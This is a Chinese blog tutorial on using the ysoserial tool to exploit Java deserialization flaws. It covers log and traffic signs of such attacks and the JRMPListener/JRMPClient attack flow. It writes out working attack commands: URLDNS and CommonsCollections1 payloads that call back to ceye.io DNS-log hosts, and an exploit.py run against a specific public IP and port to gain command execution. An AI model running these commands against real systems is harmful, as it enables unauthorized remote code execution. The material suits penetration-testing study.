<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【Web安全】Ysoserial 简单利用 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【Web安全】Ysoserial 简单利用" />
<meta property="og:description" content="Ysoserial 简单利用 1. Java 反序列化特征2. Ysoserial 流量特征3. Ysoserial 攻击流程3.1 找到序列化接口3.2 漏洞利用3.2.1 常用命令3.2.2 使用案例 4. Ysoserial 攻击原理问题参考 1. Java 反序列化特征 在日志中，特征通常表现为
请求格式 Json、xml、soap、二进制 关键字：rmi、jndi、 响应对应命令执行结果信息 2. Ysoserial 流量特征 3. Ysoserial 攻击流程 项目地址：https://github.com/frohoff/ysoserial
3.1 找到序列化接口 工具逐个探测
例如 shiro，如果有漏洞，则会返回 rememberMe=deleteMe
URLDNS 这个 gadget 一般用于渗透时Java 反序列化漏洞的探测
3.2 漏洞利用 一般会进行反弹 shell 等利用
3.2.1 常用命令 使用 ysoserial，在命令行中输入指定 command ，就会自动执行命令，发起攻击
在使用命令的时候，要先 明确使用哪一个payload
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar [payload] &#39;[command]&#39; java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xx.xxxxx.ceye.io java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;ping -c 2 rce." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/09f10d0bf953ef3fbfc18c6e482d2c45/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-30T19:22:50+08:00" />
<meta property="article:modified_time" content="2022-12-30T19:22:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【Web安全】Ysoserial 简单利用</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atelier-sulphurpool-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>Ysoserial 简单利用</h4> 
 <ul><li><ul><li><a href="#1_Java__2" rel="nofollow">1. Java 反序列化特征</a></li><li><a href="#2_Ysoserial__12" rel="nofollow">2. Ysoserial 流量特征</a></li><li><a href="#3_Ysoserial__19" rel="nofollow">3. Ysoserial 攻击流程</a></li><li><ul><li><a href="#31__23" rel="nofollow">3.1 找到序列化接口</a></li><li><a href="#32__33" rel="nofollow">3.2 漏洞利用</a></li><li><ul><li><a href="#321__39" rel="nofollow">3.2.1 常用命令</a></li><li><a href="#322__58" rel="nofollow">3.2.2 使用案例</a></li></ul> 
   </li></ul> 
   </li><li><a href="#4_Ysoserial__84" rel="nofollow">4. Ysoserial 攻击原理</a></li><li><a href="#_93" rel="nofollow">问题</a></li><li><a href="#_103" rel="nofollow">参考</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="1_Java__2"></a>1. Java 反序列化特征</h3> 
<p>在日志中，特征通常表现为</p> 
<ul><li>请求格式 Json、xml、soap、二进制 
  <ul><li>关键字：rmi、jndi、</li></ul> </li><li>响应对应命令执行结果信息</li></ul> 
<h3><a id="2_Ysoserial__12"></a>2. Ysoserial 流量特征</h3> 
<p><img src="https://images2.imgbox.com/cb/e0/wVsVdvY4_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="3_Ysoserial__19"></a>3. Ysoserial 攻击流程</h3> 
<p>项目地址：https://github.com/frohoff/ysoserial</p> 
<h4><a id="31__23"></a>3.1 找到序列化接口</h4> 
<p>工具逐个探测</p> 
<ul><li> <p>例如 shiro，如果有漏洞，则会返回 <code>rememberMe=deleteMe</code></p> </li><li> <p><code>URLDNS</code> 这个 gadget 一般用于渗透时Java <strong>反序列化漏洞的探测</strong></p> </li></ul> 
<h4><a id="32__33"></a>3.2 漏洞利用</h4> 
<p>一般会进行反弹 shell 等利用</p> 
<h5><a id="321__39"></a>3.2.1 常用命令</h5> 
<p>使用 ysoserial，在命令行中输入指定 <code>command</code> ，就会自动执行命令，发起攻击</p> 
<blockquote> 
 <p>在使用命令的时候，要先 <strong>明确使用哪一个payload</strong></p> 
</blockquote> 
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar [payload] '[command]'

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xx.xxxxx.ceye.io
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping -c 2  rce.267hqw.ceye.io'
</code></pre> 
<p><img src="https://images2.imgbox.com/27/88/pGv7R2Qp_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="322__58"></a>3.2.2 使用案例</h5> 
<p>在公网 vps 监听端口号</p> 
<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener  【port】 CommonsCollections1 '【commands】'

java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping -c 2  rce.267hqw.ceye.io'
</code></pre> 
<blockquote> 
 <p>在 vps 监听 JRMPListener 的 1099 端口，执行 ping 命令，验证是否执行成功</p> 
 <p>commands 表示要执行的命令</p> 
</blockquote> 
<p>重启一个 shell 端口</p> 
<pre><code>python exploit.py 【目标ip】 【目标端口】 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 【JRMPListener ip】  【JRMPListener port】 JRMPClient

python exploit.py 118.89.53.139  7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 118.89.53.139  1099 JRMPClient
</code></pre> 
<h3><a id="4_Ysoserial__84"></a>4. Ysoserial 攻击原理</h3> 
<p>ysoserial 中的 exploit/JRMPClient 是作为攻击方的代码，一般会结合 payloads/JRMPLIstener 使用，攻击流程就是：</p> 
<blockquote> 
 <p>先往存在漏洞的服务器发送 payloads/JRMPLIstener，使服务器反序列化该payload后，会开启一个 RMI服务并监听在设置的端口<br> 然后攻击方在自己的服务器使用 exploit/JRMPClient 与存在漏洞的服务器进行通信，并且发送一个可命令执行的payload（假如存在漏洞的服务器中有使用org.apache.commons.collections 包，则可以发送CommonsCollections系列的payload ），从而达到命令执行的结果。</p> 
</blockquote> 
<h3><a id="_93"></a>问题</h3> 
<ol><li> <p>在攻击的时候，怎么选择 CommonsCollection</p> 
  <blockquote> 
   <p>要进行逐一测试，看那条攻击链可行</p> 
  </blockquote> </li></ol> 
<h3><a id="_103"></a>参考</h3> 
<p>https://blog.csdn.net/qq_36119192/article/details/107445392?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166875295216800215084475%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166875295216800215084475&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>blog</sub>first_rank_ecpm_v1~rank_v31_ecpm-1-107445392-null-null.nonecase&amp;utm_term=ysoserial&amp;spm=1018.2226.3001.4450</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fff4ebbb09cd6badf942256bcdfdc1c7/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">mt4 api跟单接口</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4036d3660bbe913673ff49cbe0934cc8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">docker安装oracle11g</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>